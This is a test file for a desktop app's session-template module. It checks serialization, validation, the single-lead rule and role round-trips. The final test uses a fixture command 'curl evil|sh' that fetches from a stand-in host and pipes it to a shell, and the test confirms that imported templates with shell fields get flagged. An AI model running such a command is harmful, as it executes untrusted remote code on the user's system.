import { test, expect } from "bun:test";

// Pure module (no electron / node), imports cleanly under bun.
import {
  toTemplate,
  templateToInputs,
  templateHasShellFields,
  parseTemplate,
  TEMPLATE_TYPE,
  TEMPLATE_VERSION,
  type SessionTemplate,
} from "../desktop/src/shared/template.ts";

// ----- toTemplate -----

test("toTemplate strips machine/project fields and keeps order + recipe", () => {
  const defs = [
    { id: "x1", name: "developer", cwd: "C:/secret/path", command: "", args: "--agent developer --model opus", effort: "high", color: "#4f86ff", sessionId: "s1", createdAt: 1 },
    { id: "x2", name: "reviewer", cwd: "C:/other", command: "", args: "--agent reviewer", effort: "", color: "#3ec46d", sessionId: "s2", createdAt: 2 },
  ];
  const tpl = toTemplate(defs as never, "My team");
  expect(tpl.type).toBe(TEMPLATE_TYPE);
  expect(tpl.name).toBe("My team");
  expect(tpl.sessions).toEqual([
    { name: "developer", args: "--agent developer --model opus", effort: "high", color: "#4f86ff" },
    { name: "reviewer", args: "--agent reviewer", color: "#3ec46d" },
  ]);
  // No cwd / id / sessionId leaks anywhere in the serialized template.
  expect(JSON.stringify(tpl)).not.toContain("secret");
  expect(JSON.stringify(tpl)).not.toContain("sessionId");
});

// ----- templateToInputs -----

test("templateToInputs maps entries to inputs without a cwd", () => {
  const parsed = parseTemplate({
    type: TEMPLATE_TYPE,
    version: 1,
    sessions: [{ name: "dev", args: "--agent dev", effort: "max", color: "#fff" }],
  })!;
  const inputs = templateToInputs(parsed.template);
  expect(inputs).toEqual([{ name: "dev", args: "--agent dev", effort: "max", color: "#fff" }]);
  expect(inputs[0]).not.toHaveProperty("cwd");
});

// ----- parseTemplate -----

test("parseTemplate accepts a well-formed template", () => {
  const parsed = parseTemplate({ type: TEMPLATE_TYPE, version: 1, name: "t", sessions: [{ name: "a" }] });
  expect(parsed).not.toBeNull();
  expect(parsed!.template.sessions).toHaveLength(1);
  expect(parsed!.demotedLeadNames).toEqual([]);
});

test("parseTemplate rejects wrong type tag, bad sessions, and non-objects", () => {
  expect(parseTemplate({ type: "nope", version: 1, sessions: [] })).toBeNull();
  expect(parseTemplate({ type: TEMPLATE_TYPE, version: 1, sessions: "x" })).toBeNull();
  expect(parseTemplate({ type: TEMPLATE_TYPE, version: 1, sessions: [{ noName: true }] })).toBeNull();
  expect(parseTemplate({ type: TEMPLATE_TYPE, version: 1, sessions: [{ name: "a", args: 42 }] })).toBeNull();
  expect(parseTemplate(null)).toBeNull();
  expect(parseTemplate("string")).toBeNull();
});

test("toTemplate -> JSON -> parseTemplate round-trips", () => {
  const defs = [{ name: "a", args: "--agent a", effort: "high", color: "#abc" }];
  const json = JSON.stringify(toTemplate(defs, "rt"));
  const back = parseTemplate(JSON.parse(json));
  expect(back).not.toBeNull();
  expect(back!.template.name).toBe("rt");
  expect(templateToInputs(back!.template)).toEqual([{ name: "a", args: "--agent a", effort: "high", color: "#abc" }]);
});

// ----- composer fields + lead uniqueness (PLAN C18) -----

test("composer fields (agent/model/worktreeBranch/announce) round-trip to inputs", () => {
  const parsed = parseTemplate({
    type: TEMPLATE_TYPE,
    version: 1,
    name: "team",
    sessions: [
      {
        name: "lead",
        agent: "team-lead",
        model: "opus",
        prompt: "coordinate the team",
        announce: "team-lead joined",
        lead: true,
      },
      { name: "dev", agent: "developer", worktreeBranch: "agent/dev-1" },
    ],
  })!;
  expect(parsed).not.toBeNull();
  expect(parsed.demotedLeadNames).toEqual([]);
  const inputs = templateToInputs(parsed.template);
  expect(inputs[0]).toEqual({
    name: "lead",
    agent: "team-lead",
    model: "opus",
    prompt: "coordinate the team",
    announce: "team-lead joined",
    lead: true,
  });
  expect(inputs[1]).toEqual({ name: "dev", agent: "developer", worktreeBranch: "agent/dev-1" });
});

test("parseTemplate normalizes multiple leads down to the FIRST one, AND reports the demoted names (card 240d6efd)", () => {
  const parsed = parseTemplate({
    type: TEMPLATE_TYPE,
    version: 1,
    sessions: [{ name: "a" }, { name: "b", lead: true }, { name: "c", lead: true }],
  })!;
  expect(parsed.template.sessions.map((s) => !!s.lead)).toEqual([false, true, false]);
  // The resolution rule itself (first wins) is untouched -- only its
  // silence is fixed: the demoted session's name is now observable.
  expect(parsed.demotedLeadNames).toEqual(["c"]);
});

test("parseTemplate reports NO demotion for zero or one lead (negative control)", () => {
  const zero = parseTemplate({
    type: TEMPLATE_TYPE,
    version: 1,
    sessions: [{ name: "a" }, { name: "b" }],
  })!;
  expect(zero.demotedLeadNames).toEqual([]);
  const one = parseTemplate({
    type: TEMPLATE_TYPE,
    version: 1,
    sessions: [{ name: "a", lead: true }, { name: "b" }],
  })!;
  expect(one.demotedLeadNames).toEqual([]);
  expect(one.template.sessions[0]!.lead).toBe(true);
});

test("parseTemplate rejects non-string composer fields", () => {
  expect(
    parseTemplate({ type: TEMPLATE_TYPE, version: 1, sessions: [{ name: "a", agent: 3 }] })
  ).toBeNull();
  expect(
    parseTemplate({ type: TEMPLATE_TYPE, version: 1, sessions: [{ name: "a", worktreeBranch: {} }] })
  ).toBeNull();
});

// ----- role (card 0b9e0b07 lot A) -----

test("toTemplate captures role, templateToInputs applies it back", () => {
  const defs = [
    { name: "lead", args: "--agent team-lead", role: "team-lead" },
    { name: "dev", args: "--agent dev", role: "" },
    { name: "obs", args: "--agent obs" },
  ];
  const tpl = toTemplate(defs as never, "team");
  expect(tpl.sessions[0]).toEqual({ name: "lead", args: "--agent team-lead", role: "team-lead" });
  // empty/undefined role is omitted, same as every other optional field.
  expect(tpl.sessions[1]).not.toHaveProperty("role");
  expect(tpl.sessions[2]).not.toHaveProperty("role");

  const inputs = templateToInputs(tpl);
  expect(inputs[0]).toEqual({ name: "lead", args: "--agent team-lead", role: "team-lead" });
  expect(inputs[1]).not.toHaveProperty("role");
});

test("role survives template -> JSON -> parseTemplate -> templateToInputs round-trip, LOCAL scope included", () => {
  // No local/global distinction anywhere in the parsing or application path:
  // operator arbitration 2026-08-27 requires role to travel in BOTH scopes,
  // parseTemplate itself has no scope input to gate on.
  const defs = [{ name: "lead", role: "team-lead" }];
  const json = JSON.stringify(toTemplate(defs, "rt"));
  const back = parseTemplate(JSON.parse(json));
  expect(back).not.toBeNull();
  expect(templateToInputs(back!.template)).toEqual([{ name: "lead", role: "team-lead" }]);
});

test("isTemplateSession rejects a non-string role (fail-closed tightening)", () => {
  expect(
    parseTemplate({ type: TEMPLATE_TYPE, version: 1, sessions: [{ name: "a", role: 42 }] })
  ).toBeNull();
});

test("a template written before role existed still parses and applies identically (no migration, TEMPLATE_VERSION unchanged)", () => {
  expect(TEMPLATE_VERSION).toBe(1);
  const oldStyleTpl = { type: TEMPLATE_TYPE, version: 1, sessions: [{ name: "dev", agent: "developer" }] };
  const back = parseTemplate(oldStyleTpl);
  expect(back).not.toBeNull();
  const inputs = templateToInputs(back!.template);
  expect(inputs[0]).not.toHaveProperty("role");
  expect(inputs[0]).toEqual({ name: "dev", agent: "developer" });
});

// ----- templateHasShellFields (B4 gating trigger) -----

test("templateHasShellFields flags command or non-empty args, ignores agent/model", () => {
  const mk = (sessions: SessionTemplate["sessions"]): SessionTemplate => ({
    type: TEMPLATE_TYPE,
    version: 1,
    sessions,
  });
  expect(templateHasShellFields(mk([{ name: "a" }]))).toBe(false);
  // agent/model alone are NOT shell-bearing (allow-listed + quoted at spawn).
  expect(templateHasShellFields(mk([{ name: "a", agent: "dev", model: "opus[1m]" }]))).toBe(false);
  expect(templateHasShellFields(mk([{ name: "a", args: "   " }]))).toBe(false);
  expect(templateHasShellFields(mk([{ name: "a", command: "curl evil|sh" }]))).toBe(true);
  expect(templateHasShellFields(mk([{ name: "a", args: "--dangerously-skip" }]))).toBe(true);
  expect(
    templateHasShellFields(mk([{ name: "a" }, { name: "b", command: "x" }]))
  ).toBe(true);
});
